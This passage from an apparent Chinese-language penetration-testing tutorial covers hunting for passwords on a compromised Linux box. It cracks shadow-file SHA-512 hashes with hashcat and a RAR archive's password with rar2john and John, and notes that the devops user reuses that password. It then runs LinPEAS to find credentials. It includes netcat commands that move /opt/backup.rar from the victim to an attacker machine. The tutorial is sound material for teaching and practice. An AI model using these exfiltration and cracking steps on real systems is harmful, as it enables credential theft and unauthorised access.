<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -h | grep -i &#x27;$6&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849280-2022246819-b9def53648ff8da613ac2413e842ab59.png" width="655" height="78" class="img_ev3q"></p>
<p>这里告诉我们这是一个 SHA-512 Unix OS 哈希，当我们看到它们看起来像影子文件哈希时，我们已经预料到了 – 因为它们就是！</p>
<p>由于 Unix SHA-512 哈希值相当不错，因此需要几个小时才能跑完整个 <strong>rockyou.txt</strong> 文件。因此，我们可以使用较精简版本的 <strong>rockyou</strong> 来加快速度。如果不成功，我们可以找一个更大一些的单词表。</p>
<blockquote>
<p>您可以从  <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">SecLists</a> 中获得一些 rockyou 的精简版本，以及更多优秀的单词表。</p>
</blockquote>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -m 1800 ./shadow.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -o shadow.cracked</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849601-1505381248-04ca10c4e1c52b0d15d107b26712d632.png" width="720" height="309" class="img_ev3q"></p>
<p>在一分钟的时间内，hashcat 针对两个哈希值跑完了整个单词列表，但只恢复了一个。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140850028-1428430647-5121fd814ea52a419d2998cdcf46317b.png" width="873" height="63" class="img_ev3q"></p>
<p>此时，我们可以用找到的这个密码进行尝试来增加我们的访问权限。并且，我们还可以使用更长字典来对第二个哈希重新运行 hashcat。但是，我们已经找到了这个密码，所以让我们继续吧！</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="6密码搜寻--受密码保护的文件"><strong><div id="id6">6、密码搜寻 – 受密码保护的文件</div></strong><a href="#6密码搜寻--受密码保护的文件" class="hash-link" aria-label="6密码搜寻--受密码保护的文件的直接链接" title="6密码搜寻--受密码保护的文件的直接链接">​</a></h2>
<p>对于我们的最后一个手动示例，我们将研究在枚举过程中可能值得仔细检查的有趣文件类型，这包括 <strong>PDF、RAR、ZIP、7z</strong> 等文件。当然，这些文件可能受密码保护。</p>
<p>由于密码重用是一个反复出现的问题，因此通常会发现用于保护文件的密码通常与用户登录时使用的密码相同。</p>
<p>假设在目标机器站稳脚跟后，我们检查公共文件夹中是否存在有趣的文件。当我们检查 <strong>/opt</strong> 文件夹时，我们发现其中有一个名为 backup.rar 的有趣 RAR 文件 ，该文件属于 devops 用户。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849141-1774488124-3f459b7e25ca08026a29768063af7a4e.png" width="468" height="122" class="img_ev3q"></p>
<p>由于这是一个备份文件，因此我们应该考虑将此文件下载到我们的攻击者机器上用以仔细查看。为此，我们可以使用 <strong>netcat</strong>。</p>
<p>首先，我们需要在攻击者的机器上设置一个监听器来获取文件。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc -nvlp 443 &gt; backup.rar</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>运行该程序后，我们在受害者机器上运行以下命令，将 backup.rar 文件提供给攻击者机器：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc 172.16.1.30 443 &lt; /opt/backup.rar</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>当我们检查攻击者的机器时，我们可以看到文件已完整发送（396 字节）。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849835-428271663-12729fb60df1d2a0bdadc079374aa5c9.png" width="505" height="139" class="img_ev3q"></p>
<p>现在该文件已提供给我们的攻击者机器，我们可以尝试使用 <strong>unrar</strong> 命令和 <strong>“e”</strong> 选项来提取它。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">unrar e ./backup.rar</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849310-302774795-64a3712c3a307acde086adbc4adbb26a.png" width="552" height="166" class="img_ev3q"></p>
<p>但是解压失败了，因为需要密码才能解压！</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="61使用-john-破解-rar-文件密码"><strong><div id="id6.1">6.1、使用 John 破解 RAR 文件密码</div></strong><a href="#61使用-john-破解-rar-文件密码" class="hash-link" aria-label="61使用-john-破解-rar-文件密码的直接链接" title="61使用-john-破解-rar-文件密码的直接链接">​</a></h4>
<p>由于我们尝试破解的是 RAR 文件，因此我们可以使用 <strong>rar2john</strong> 将 RAR 文件转换为可破解的格式。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rar2john ./backup.rar &gt; john_rar</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849385-227787805-1e0dadfad799bd648808cc9b3b8bf3ca.png" width="603" height="260" class="img_ev3q"></p>
<p>将输出重定向到文件后，我们现在可以尝试使用 John 和 rockyou.txt 单词表来破解密码。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john john_rar --wordlist=/usr/share/wordlists/rockyou.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140850195-1669495652-c571490b023cce014a041e824f7d80ee.png" width="757" height="173" class="img_ev3q"></p>
<p>不到一分钟，john 就破解了密码：<strong>DeVeLoPeR712</strong></p>
<p>现在我们可以使用此密码解压 RAR 文件并查看里面的内容了。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849472-1807041362-3b99ac561f02629677525c41e4d1e723.png" width="598" height="234" class="img_ev3q"></p>
<p>成功了！我们解压了三个文件：container_info.txt、ubuntu_config.txt 和 devops.txt。不过，在检查了这三个文件的内容后，我们并没有发现什么有趣的东西。</p>
<p>我们可以看到有提示表明该文件属于 <strong>devops</strong> 用户，并且我们已经看到 <strong>DeVeLoPeR712</strong> 与该用户登录系统时使用的密码相同。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="7自动工具寻找密码--linpeas"><strong><div id="id7">7、自动工具寻找密码 – LinPEAS</div></strong><a href="#7自动工具寻找密码--linpeas" class="hash-link" aria-label="7自动工具寻找密码--linpeas的直接链接" title="7自动工具寻找密码--linpeas的直接链接">​</a></h2>
<p>最后，我们来到了工具部分！在这里，我们将看到 LinPEAS 究竟为我们枚举了多少我们手动找到的东西。</p>
<blockquote>
<p>关于 LinPEAS 工具的传输部分此处省略。</p>
</blockquote>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849717-2030021838-7d04309d6392b9da3511280a7189294f.png" width="959" height="251" class="img_ev3q"></p>
<p>执行命令 <strong>./linpeash.sh</strong>  后会输出很多枚举内容，要查找密码相关的信息，我们需要向下滚动到 <strong>Interesting Files</strong> 部分，有时还需要查看 <strong>Software Information</strong> 部分。</p>
<p>首先，让我们看看 LinPEAS 是如何处理文件和文件名中的密码搜索。</p>
<p>我们可以看到 LinPEAS 的搜索非常有针对性，因此输出结果并不多。对于文件名中有趣的字符串，LinPEAS 只有以下子部分：<strong>Searching <em>password</em> or <em>credential</em> files in home (limit 70)</strong>。虽然它说的是“在 home 目录中”，但它实际上会检查整个文件系统。遗憾的是，70 的限制有助于减少输出结果，但它也遗漏了许多潜在的可能。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849965-2019659535-317f875ec31b3eaa34682b82fe7b90a8.png" width="708" height="384" class="img_ev3q"></p>
<p>文件内容中的字符串搜索也非常有针对性，例如它在日志文件、配置 PHP 文件以及其他一些文件中搜索密码。</p>
<p>对于 LinPEAS 示例的其余部分，我们将查看它能够找到多少与我们找到的相同的文件。</p>
<ul>
<li><strong>Config.php?</strong> – 找到了！且提取了密码的内容。</li>
</ul>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140850297-1911161252-9f4c5c2bd12b975e49715e9b13adb969.png" width="525" height="193" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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